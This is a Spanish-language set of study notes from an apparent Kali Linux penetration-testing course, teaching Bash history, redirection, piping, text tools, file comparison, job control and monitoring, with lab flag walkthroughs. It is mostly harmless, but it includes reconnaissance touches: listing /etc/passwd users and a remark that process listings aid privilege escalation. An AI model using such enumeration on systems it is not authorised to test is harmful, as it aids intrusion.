+<p>Otra característica útil de Bash consiste en que guarda el historial en el fichero <em>.bash_history</em> accesible mediante en comando: <em>history</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">history
+  </span>1  <span class="nb">cat</span> /etc/lsb-release
+  2  clear
+  3  <span class="nb">history</span>
+</code></pre></div></div>
+
+<p>Estas líneas representan comandos que se han introducido con anterioridad en la sesión actual de Bash representados en orden. Estos comandos son accesibles mediante el operador ‘!’ seguido del número de la línea. Por ejemplo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="o">!</span>1
+<span class="nb">cat</span> /etc/lsb-release
+<span class="nv">DISTRIB_ID</span><span class="o">=</span>Kali
+<span class="nv">DISTRIB_RELEASE</span><span class="o">=</span>kali-rolling
+<span class="nv">DISTRIB_CODENAME</span><span class="o">=</span>kali-rolling
+<span class="nv">DISTRIB_DESCRIPTION</span><span class="o">=</span><span class="s2">"Kali GNU/Linux Rolling"</span>
+</code></pre></div></div>
+
+<p>De la misma forma ‘!!’ ejecuta el comando inmediatamente anterior</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">sudo </span>systemctl restart apache2
+
+kali@kali:~<span class="nv">$ </span><span class="o">!!</span>
+<span class="nb">sudo </span>systemctl restart apache2
+</code></pre></div></div>
+
+<p>Por otra parte, existen dos “envvar” asociados al fichero: HISTSIZE y HISTFILESIZE.</p>
+
+<p>El primero contiene el número de comandos (de líneas) que tiene el fichero y el segundo contiene la configuración del número mázimo de comandos que se guardan. Ambas pueden ser editadas según nuestras necesidades en el fichero ‘.bashrc’ que guarda la configuración de la sesión actual de Bash.</p>
+
+<p>Otra forma de navegar por el historial consiste en utilizar las flechas de dirección y utilizar la combinación Ctrl+R, esto habilitará una característica de búsqueda. Si introducimos una letra nos dará el último comando introducido que tuviera esa letra:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="o">[</span>CTRL-R]c
+<span class="o">(</span>reverse-i-search<span class="o">)</span><span class="sb">`</span>ca<span class="s1">': cat /etc/lsb-release 
+</span></code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="13-práctica---the-bash-enviroment">1.3. Práctica - The Bash Enviroment.</h4>
+
+<p><strong>1er Flag</strong></p>
+
+<p>Nos logeamos a través de SSH a la máquina con las credenciales “student-lab”. El enunciado nos indica que nuestra flag se encuentra enumerando las variables de entorno. Así pues, utilizamos el comando ‘env’ para obtener un listado de las mismas y obtener nuestra flag:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221204161934.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>2da Flag</strong></p>
+
+<p>De nuevo nos logeamos, y el enunciado nos dice que podemos encontrar nuestra flag al final de un directorio, acudimos a el completado cada vez con TAB y obtenemos nuestra flag:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221204164006.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>3er Flag</strong></p>
+
+<p>Nos logeamos y el enunciado nos incita a repasar el historial, de forma que lo hacemos y vemos un comando sospechoso. Al reproducirlo obtenemos el flag:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221204164856.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h3 id="2-piping--redirection">2. Piping &amp; Redirection.</h3>
+
+<p>Cualquier programa que se ejecute desde un entorno de línea de comandos tiene tres canales de comunicación:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>STREAM NAME</th>
+      <th>DESCRIPCIÓN</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Standard Input (STDIN)</td>
+      <td>Input del programa (teclado por defecto)</td>
+    </tr>
+    <tr>
+      <td>Standard Output (STDOUT)</td>
+      <td>Output del programa (terminal por defecto)</td>
+    </tr>
+    <tr>
+      <td>Standard Error (STDERR)</td>
+      <td>Mensajes de error (terminal por defecto)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Estos canales definen la dirección de entrada y salida de información del programa.</p>
+
+<p>La dirección de estos canales puede ser manipulada a través de dos tipos de técnicas conocidas como <em>piping</em> y <em>redirection</em>.</p>
+
+<p><br /></p>
+
+<h4 id="21-redirecting-to-a-file">2.1. Redirecting to a file.</h4>
+
+<p>Con el operador ‘redirección’ (&gt;) podemos enviar el STDOUT como el STDERR de un programa sobre un fichero. (Debemos recordar que esto no sólo incluye ficheros convencionales si no cualquier cosa ya que Linux entiende todo como un fichero del que lee datos o sobre el que escribe contenido).</p>
+
+<p>Así por ejemplo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">ls
+</span>Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+
+kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"test"</span>
+<span class="nb">test
+
+</span>kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"test"</span> <span class="o">&gt;</span> redirection_test.txt
+
+kali@kali:~<span class="nv">$ </span><span class="nb">ls 
+</span>Desktop  Documents  Downloads  Music  Pictures  Public  redirection_test.txt  Template
+
+kali@kali:~<span class="nv">$ </span><span class="nb">cat </span>redirection_test.txt
+<span class="nb">test
+
+</span>kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Kali Linux is an open source project"</span> <span class="o">&gt;</span> redirection_test.txt
+
+kali@kali:~<span class="nv">$ </span><span class="nb">cat </span>redirection_test.txt
+Kali Linux is an open <span class="nb">source </span>projec
+</code></pre></div></div>
+
+<p>En el comando anterior podemos ver como desviamos el output de un comando sobre un fichero que antes no existía mediante el redirector ‘&gt;’. El fichero se ha creado con el output del comando. Si el fichero ya existía previamente, se borrará su contenido y se sustituirá por el output del programa.</p>
+
+<p><br /></p>
+
+<h4 id="22-redirecting-from-a-file">2.2. Redirecting from a file.</h4>
+
+<p>Por otro lado, la operación inversa también puede efectuarse con el redirector inverso (&lt;). Podemos introducir el contenido de un fichero como input de un comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">wc</span> <span class="nt">-m</span> &lt; redirection_test.txt 
+89
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="23-redirecting-stderr-file-descriptors">2.3. Redirecting STDERR. File descriptors.</h4>
+
+<p>Asociados al los canales de transmisión de datos se encuentran los ‘file descriptors’, enteros no negativos que identifican un fichero o un proceso relacionado con un fichero. De acuerdo con el standard de POSIX, los files descriptors del STDIN, STDOUT y STDERR son respectivamente 0, 1 y 2 y pueden ser utilizados conjuntamente con los redirectores para redirigir los datastream a conveniencia.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nb">.</span>
+Desktop  Documents  Downloads  Music  Pictures  Public  redirection_test.txt  Template
+
+kali@kali:~<span class="nv">$ </span><span class="nb">ls</span> ./test
+<span class="nb">ls</span>: cannot access <span class="s1">'/test'</span>: No such file or directory
+
+kali@kali:~<span class="nv">$ </span><span class="nb">ls</span> ./test 2&gt;error.txt
+
+kali@kali:~<span class="nv">$ </span><span class="nb">cat </span>error.txt 
+<span class="nb">ls</span>: cannot access <span class="s1">'/test'</span>: No such file or directory
+</code></pre></div></div>
+
+<p>Observamos en el ejemplo anterior que el fichero sólo contiene el error del mensaje anterior.</p>
+
+<p><br /></p>
+
+<h4 id="24-piping">2.4. Piping.</h4>
+
+<table>
+  <tbody>
+    <tr>
+      <td>El piping es una operación que consiste en introducir el output de un comando como input en otro comando. Esto se puede realizar mediante el operador pipe ‘</td>
+      <td>’:</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">cat </span>error.txt 
+<span class="nb">ls</span>: cannot access <span class="s1">'/test'</span>: No such file or directory
+
+kali@kali:~<span class="nv">$ </span><span class="nb">cat </span>error.txt | <span class="nb">wc</span> <span class="nt">-m</span>
+53
+
+kali@kali:~<span class="nv">$ </span><span class="nb">cat </span>error.txt | <span class="nb">wc</span> <span class="nt">-m</span> <span class="o">&gt;</span> count.txt
+
+kali@kali:~<span class="nv">$ </span><span class="nb">cat </span>count.txt 
+53
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="25-practice---piping--redirection">2.5. Practice - Piping &amp; Redirection.</h4>
+
+<p><strong>1er Flag</strong></p>
+
+<p>En este caso nos informan de que existe un fichero en la máquina que contiene la copia exacta de un fichero .tar.gz que contiene un directorio que contiene ficheros que contienen nuestra flag. Así, copiamos dicho fichero a un fichero con la extensión .tar.gz y lo descomprimimos y acto seguido buscamos en los contenidos nuestra flag:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221204192412.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h3 id="3-text-searching-and-manipulation">3. Text Searching and manipulation.</h3>
+
+<p>Ahora vamos a prensentar un conjunto de herramientas que nos permitirán manipular texto y efectuar búsquedas sobre ciertos desplieges de ficheros.</p>
+
+<p><br /></p>
+
+<h4 id="31-grep">3.1. Grep.</h4>
+
+<p>Grep es un programa que busca sobre ficheros de texto en base a una expresión regular dada (una instrucción compleja de búsqueda) y despliega la línea que contiene un match para el patrón dado. Un ejemplo sencillo del uso de grep sería el siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /usr/bin | <span class="nb">grep </span>zip
+<span class="nt">-rwxr-xr-x</span>  3 root root   34480 Jan 29  2017 bunzip2
+<span class="nt">-rwxr-xr-x</span>  3 root root   34480 Jan 29  2017 bzip2
+<span class="nt">-rwxr-xr-x</span>  1 root root   13864 Jan 29  2017 bzip2recover
+<span class="nt">-rwxr-xr-x</span>  2 root root    2301 Mar 14  2016 <span class="nb">gunzip</span>
+<span class="nt">-rwxr-xr-x</span>  1 root root  105172 Mar 14  2016 <span class="nb">gzip</span>
+</code></pre></div></div>
+
+<p>El comando anterior a recogido del listado todas aquellas líneas que contuvieran el término ‘zip’.</p>
+
+<p><br /></p>
+
+<h4 id="32-sed">3.2. Sed.</h4>
+
+<p>Sed es un editor de texto a través de línea de comando. Es muy complejo pero a alto nivel sed realiza cambios en las líneas de texto que se le pasa como input:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"I need to try hard"</span> | <span class="nb">sed</span> <span class="s1">'s/hard/harder/'</span>
+I need to try harder
+</code></pre></div></div>
+
+<p>En el ejemplo anterior se pasa como input una linea a Sed que sustituye el término hard por harder.</p>
+
+<p><br /></p>
+
+<h4 id="33-cu">3.3. Cu</h4>
+
+<p>El comando <em>Cut</em> nos permite cortar líneas de texto en base a patrones y extraer la parte que nos interesa:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"I hack binaries,web apps,mobile apps, and just about anything else"</span>| <span class="nb">cut</span> <span class="nt">-f</span> 2 <span class="nt">-d</span> <span class="s2">","</span>
+web apps
+</code></pre></div></div>
+
+<p>El comando anterior selecciona una línea, la dividide en campos por comas y muestra por pantalla el segundo campo. Otro ejemplo sería:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">":"</span> <span class="nt">-f</span> 1 /etc/passwd
+roo
+daemon
+bin
+sys
+<span class="nb">sync
+</span>games
+...
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="34-awk">3.4. AWK.</h4>
+
+<p>AWK es una herramienta que utiliza un lenguaje de programación que lleva su mismo nombre y que está diseñado para el procesamiento de texxto. De nuevo, es demasiado complicado como para ofrecer una síntesis apropiada pero un ejemplo de uso sería el siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"hello::there::friend"</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"::"</span> <span class="s1">'{print $1, $3}'</span>
+hello friend
+</code></pre></div></div>
+
+<p>El resultado se explica por sí solo. La línea queda divida en campos a partir del “::” y seguidamente se despliegan el primer y el tercer campo.</p>
+
+<p><br /></p>
+
+<h4 id="35-practice---text-searching--manipulation">3.5. Practice - Text Searching &amp; Manipulation.</h4>
+
+<p><strong>1er Flag</strong></p>
+
+<p>Nos logeamos y tratamos de ver qué hay en el fichero indicado.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221204231947.png" text-align="center" />
+</div>
+
+<p>Nos dicen que nuestra flag está escondida entre este texto y que probemos a obtener el decimo tercer campo, al dividirlo todo entre comas y seleccionar el 13 campo de cada línea obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221204232044.png" text-align="center" />
+</div>
+
+<p>De esta forma, juntamos cada letra en la misma línea ordenando en horizontal todas las líneas y obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221204232120.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>2da Flag</strong></p>
+
+<p>En este caso nos indican un fichero que contienen muchas flags, pero que la auténtica es la más pequeña. Así, las ordenamos de menor a mayor y obtenemos la cabecera del documento:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221204232552.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h3 id="4-comparing-files">4. Comparing Files</h3>
+
+<p>En esta sección vamos a aprender una serie de comandos que nos permiten diferenciar el contenido de diversos ficheros.</p>
+
+<p><br /></p>
+
+<h4 id="41-comm">4.1. Comm.</h4>
+
+<p>El comando <em>Comm</em> compara dos ficheros de texto desplegando las líneas que son únicas para cada uno. El output consiste en tres columnas: en la primera se muestra las líneas únicas para el fichero del primer argumento, en la segunda se muestran las líneas únicas para el fichero del segundo argumento y la tercera despliega las líneas que ambos ficheros tienen en común:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">cat </span>scan-a.txt
+192.168.1.1
+192.168.1.2
+192.168.1.3
+192.168.1.4
+192.168.1.5
+
+kali@kali:~<span class="nv">$ </span><span class="nb">cat </span>scan-b.txt
+192.168.1.1
+192.168.1.3
+192.168.1.4
+192.168.1.5
+192.168.1.6
+
+kali@kali:~<span class="nv">$ </span><span class="nb">comm </span>scan-a.txt scan-b.txt 
+								192.168.1.1
+192.168.1.2
+								192.168.1.3
+								192.168.1.4
+								192.168.1.5
+			  192.168.1.6
+</code></pre></div></div>
+
+<p>Aunque también se puede utilizar para que muestre sólo las líneas comunes a ambos ficheros.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">comm</span> <span class="nt">-12</span> scan-a.txt scan-b.txt
+192.168.1.1
+192.168.1.3
+192.168.1.4
+192.168.1.5
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="42-diff">4.2. Diff.</h4>
+
+<p>El comando ‘Diff’ tiene un propósito similar con la diferencia de que es mucho más complejo aunque también mucho más flexible. Dos de los formatos o parámetros más conocidos de Diff con ‘-c’ (context format) y ‘-u’ (unified format).</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">kali@kali:~$ diff -c scan-a.txt scan-b.txt
+</span><span class="err">***</span> scan-a.txt	2018-02-07 14:46:21.557861848 -0700
+<span class="gd">--- scan-b.txt	2018-02-07 14:46:44.275002421 -0700
+</span><span class="err">***************</span>
+*** 1,5 ****
+  192.168.1.1
+<span class="gd">- 192.168.1.2
+</span>  192.168.1.3
+  192.168.1.4
+  192.168.1.5
+<span class="gd">--- 1,5 ----
+</span>  192.168.1.1
+  192.168.1.3
+  192.168.1.4
+  192.168.1.5
+<span class="gi">+ 192.168.1.6
+</span></code></pre></div></div>
+
+<p>El context format muestra los contenidos de ambos ficheros señalando las líneas que son propias de cada uno de ellos y que no están en el homólogo. Por otra parte el unified format muestra el contenido de ambos ficheros como un sólo bloque indicando que líneas son de cada fichero:</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">kali@kali:~$ diff -u scan-a.txt scan-b.txt
+</span><span class="gd">--- scan-a.txt	2018-02-07 14:46:21.557861848 -0700
+</span><span class="gi">+++ scan-b.txt	2018-02-07 14:46:44.275002421 -0700
+</span><span class="p">@@ -1,5 +1,5 @@</span>
+ 192.168.1.1
+<span class="gd">-192.168.1.2
+</span> 192.168.1.3
+ 192.168.1.4
+ 192.168.1.5
+<span class="gi">+192.168.1.6
+</span></code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="43-vimdiff">4.3. Vimdiff.</h4>
+
+<p>Vimdiff abre vim con varias ventanas. Cada ventana abre cada fichero indicando qué lineas están o no están en según qué fichero:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span>vimdiff scan-a.txt scan-b.txt
+</code></pre></div></div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221205105948.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h4 id="44-practice---comparing-files">4.4. Practice - Comparing Files.</h4>
+
+<p><strong>1er Flag</strong></p>
+
+<p>En este ejercicio en primer lugar se nos pide observar las diferencias (y sólo las diferencias) entre dos ficheros para obtener nuestra flag. Esto se puede conseguir mediante el comando; diff -d:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221205112105.png" text-align="center" />
+</div>
+
+<p>Así, filtramos el output para obtener nuestra flag:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221205112225.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h3 id="5-manejando-procesos">5. Manejando Procesos.</h3>
+
+<p>Un proceso es una instancia de un programa siendo ejecutado por el kernel. El kernel es capaz de llevar a cabo gestión de varias tareas a través de los procesos los cuales están identificados a través de un ID (PID) un número que identifica unívocamente al proceso en cuestión.</p>
+
+<p>La shell de Linux también introduce el concepto de ‘job’. Un Job es el conjunto de procesos asociados al desempeño de un comando en la terminal. Por ejemplo, el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>error.txt | <span class="nb">wc</span> <span class="nt">-m</span>
+</code></pre></div></div>
+
+<p>Es una concatenación de programas que pasan su output de uno al otro y que por tanto, necesariamente va a derivar en varios procesos. El conjutno de procesos que forman parte de este comando es el job de ese comando.</p>
+
+<p>Por otra parte, asociado al concepto de <em>Job</em> está relacionado <em>Job Control</em> que alude a la habilidad de selectivamente detener, suspender o reanudar la ejecución de un Job ya sea en segundo plano o en foreground.</p>
+
+<p><br /></p>
+
+<h4 id="51-backgrounding-process-bg">5.1. Backgrounding Process (bg).</h4>
+
+<p>Que un proceso se ejecute en primer plano o en el foreground significa que el comando se ejecuta de forma que la terminal se mantiene ocupado en su procesamiento y ningún otro comando puede ser ejecutado desde dicha terminal hasta que este termine.</p>
+
+<p>Para lanzar un programa o un comando a la ejecución en segundo plano existen dos métodos. El primero consiste en añadir al final de la línea que define el comando un ‘ampersand’: &amp;.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span>ping <span class="nt">-c</span> 400 localhost <span class="o">&gt;</span> ping_results.txt &amp;
+</code></pre></div></div>
+
+<p>Otra forma consiste en suspenderlo desde la consola mediante la combinación Ctrl+Z, (no confundir con Ctrl+C que sería directamente cancelar el programa) y acto seguido continuar la ejecución en segundo plano con el comando ‘bg’.</p>
+
+<p><br /></p>
+
+<h4 id="52-jobs-control-jobs-and-fg">5.2. Jobs Control: Jobs and fg.</h4>
+
+<p>Antes hemos visto una forma muy básica de gestionar comandos sin embargo una gestión más compleja y a la vez más flexible y sofisticada requiere de la introducción de dos nuevos comandos: jobs y fg.</p>
+
+<p>Jobs lista los jobs que están ejecutándose en la terminal</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span>ping <span class="nt">-c</span> 400 localhost <span class="o">&gt;</span> ping_results.txt
+^Z
+<span class="o">[</span>1]+  Stopped                 ping <span class="nt">-c</span> 400 localhost <span class="o">&gt;</span> ping_results.txt
+
+kali@kali:~<span class="nv">$ </span>find / <span class="nt">-name</span> sbd.exe
+^Z
+<span class="o">[</span>2]+  Stopped                 find / <span class="nt">-name</span> sbd.exe
+
+kali@kali:~<span class="nv">$ </span><span class="nb">jobs</span>
+<span class="o">[</span>1]-  Stopped                 ping <span class="nt">-c</span> 400 localhost <span class="o">&gt;</span> ping_results.txt
+<span class="o">[</span>2]+  Stopped                 find / <span class="nt">-name</span> sbd.exe
+</code></pre></div></div>
+
+<p>Por otro lado, el comando ‘fg’ trae de vuelta a primer plano un job paralizado:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">fg</span> %1
+ping <span class="nt">-c</span> 400 localhost <span class="o">&gt;</span> ping_results.txt
+^C
+
+kali@kali:~<span class="nv">$ </span><span class="nb">jobs</span>
+<span class="o">[</span>2]+  Stopped                 find / <span class="nt">-name</span> sbd.exe
+
+kali@kali:~<span class="nv">$ </span><span class="nb">fg
+</span>find / <span class="nt">-name</span> sbd.exe
+/usr/share/windows-resources/sbd/sbd.exe
+</code></pre></div></div>
+
+<p>El %1 se refiere al job así situado en la lista desplegada por Jobs, pero existen muchas otras formas de referirnos a los Jobs, a través del PID, a través del nombre del comando (%CommandName), al último job paralizado (%-) o al job actual (%+).</p>
+
+<p><br /></p>
+
+<h4 id="53-process-control-ps-and-kill">5.3. Process Control: ps and kill.</h4>
+
+<p>Hasta ahora hemos visto como gestionar Jobs, procesos asociados a comandos en la terminal. Sin embargo, también nos puede interesar obtener un listado general de todos los procesos que se ejecuten ya sea en la sesión de Bash como en todo el sistema.</p>
+
+<p>Uno de los comandos más usados para obtener un listado de los procesos es el comando <em>ps</em>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span>ps <span class="nt">-ef</span>
+UID         PID   PPID  C STIME TTY          TIME CMD
+root          1      0  0 10:18 ?        00:00:02 /sbin/init
+root          2      0  0 10:18 ?        00:00:00 <span class="o">[</span>kthreadd]
+root          3      2  0 10:18 ?        00:00:00 <span class="o">[</span>rcu_gp]
+root          4      2  0 10:18 ?        00:00:00 <span class="o">[</span>rcu_par_gp]
+root          5      2  0 10:18 ?        00:00:00 <span class="o">[</span>kworker/0:0-events]
+root          6      2  0 10:18 ?        00:00:00 <span class="o">[</span>kworker/0:0H-kblockd]
+root          7      2  0 10:18 ?        00:00:00 <span class="o">[</span>kworker/u256:0-events_unbound
+root          8      2  0 10:18 ?        00:00:00 <span class="o">[</span>mm_percpu_wq]
+root          9      2  0 10:18 ?        00:00:00 <span class="o">[</span>ksoftirqd/0]
+root         10      2  0 10:18 ?        00:00:00 <span class="o">[</span>rcu_sched]
+...
+</code></pre></div></div>
+
+<p>Esta se considera un estándard en cualquier sistema basado en Unix y es un comando muy útil para un pentester ya que ofrece una rápida muestra del software que está corriendo en la máquina y que eventualmente podría ser utilizado para elevar privilegios.</p>
+
+<p>En la imagen anterior el comando <em>ps</em> se ha utilizado en conjunción con el parámetro ‘-e’ que muestra todos los procesos del sistema y ‘-f’ que despliega el formato descriptivo completo: (UID, PID, PPID, etc). Sin embargo, otro parámetro interesante puede ser ‘-C’ que nos permite aislar la búsqueda a un nombre:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span>ps <span class="nt">-fC</span> leafpad
+UID         PID   PPID  C STIME TTY          TIME CMD
+kali       1307    938  0 10:57 ?        00:00:00 leafpad
+</code></pre></div></div>
+
+<p>Por otra parte, el comando Kill nos permite terminar in proceso. Concretamente, Kill envía una seña concreta a un proceso que provoca su terminación:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">kill </span>1307
+kali@kali:~<span class="nv">$ </span>ps aux | <span class="nb">grep </span>leafpad
+kali       1313  0.0  0.0   6144   888 pts/0    S+   10:59   0:00 <span class="nb">grep </span>leafpad
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="54-practice---managin-processes">5.4. Practice - Managin Processes.</h4>
+
+<p><strong>1er Flag</strong></p>
+
+<p>En este caso nos piden que ejecutemos un programa en la carpeta challenge que nos indica que debemos realizar una serie de tareas bajo su antenta mirada.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221205180802.png" text-align="center" />
+</div>
+
+<p>De esta forma, mandamos el proceso a segundo plano y ejecutamos con el ampersand todos los programas dentro de la carpeta ‘jobs/’ y luego traemos de vuelta el programa dirty jobs con ‘fg %1’:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221205181004.png" text-align="center" />
+</div>
+
+<p>Después de presionar enter nos pide que terminemos todos esos procesos, sencillamente los listamos con ‘jobs’:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221205181048.png" text-align="center" />
+</div>
+
+<p>Y con ‘kill %&lt;numero del job&gt;’ matamos todos los procesos de la carpeta ‘jobs’ y vovlemos a traer de vuelta el programa ‘dirty-jobs’:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221205181339.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h3 id="6-file-and-command-monitoring">6. File and Command Monitoring.</h3>
+
+<h4 id="61-head--tail">6.1. Head &amp; Tail.</h4>
+
+<p>Cuando tenemos un documento muy largo, Head &amp; Tail nos pueden ayudar a sacar porciones concretas respectivamente de arriba o de abajo del documento:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">sudo tail</span> <span class="nt">-f</span> /var/log/apache2/access.log 
+127.0.0.1 - - <span class="o">[</span>02/Feb/2018:12:18:14 <span class="nt">-0500</span><span class="o">]</span> <span class="s2">"GET / HTTP/1.1"</span> 200 3380 <span class="s2">"-"</span> <span class="s2">"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"</span>
+127.0.0.1 - - <span class="o">[</span>02/Feb/2018:12:18:14 <span class="nt">-0500</span><span class="o">]</span> <span class="s2">"GET /icons/openlogo-75.png HTTP/1.1"</span> 200 6040 <span class="s2">"http://127.0.0.1/"</span> <span class="s2">"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"</span>
+127.0.0.1 - - <span class="o">[</span>02/Feb/2018:12:18:15 <span class="nt">-0500</span><span class="o">]</span> <span class="s2">"GET /favicon.ico HTTP/1.1"</span> 404 500 <span class="s2">"-"</span> <span class="s2">"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="62-watch">6.2. Watch.</h4>
+
+<p>El comandon <em>watch</em> se emplea para correr un determinado comando a intervalos regulares con el parámetro ‘-n X’.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span>watch <span class="nt">-n</span> 5 w
+
+............
+
+Every 5.0s: w                                     kali: Tue Jan 23 21:06:03 2018
+
+ 21:06:03 up 7 days,  3:54,  1 user,  load average: 0.18, 0.09, 0.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+kali     tty2     :0               16Jan18  7days 16:29   2.51s 
+</code></pre></div></div>
+
+<p>Este comando listará todos los comandos cada 5 segundos.</p>
+
+<p><br /></p>
+
+<h4 id="63-practice---file--command-monitoring">6.3 Practice - File &amp; Command Monitoring.</h4>
+
+<p>En este caso tenemos un fichero que está scripteado para darnos la flag cada cierto intervalo de tiempo. Para obtener la flag debemos ejecutar dicho programa cada poco tiempo y esto lo podemos automatizar con watch. El problema es que el cambio es tan rápido que no nos da tiempo a copiarla con lo que hacemos es crear un script que ejecuta el binario y lleva el output sobre un fichero:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221205194830.png" text-align="center" />
+</div>
+
+<p>Y acto seguido con watch ejecutar cada poco tiempo el script desde el directorio challenge (de otra forma no se obtendrá la flag):</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221205195030.png" text-align="center" />
+</div>
+
+<p>Transcurrido un breve tiempo sólo tendremos que volcar el contenido del fichero con el término OS para obtener la flag:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020221205195140.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
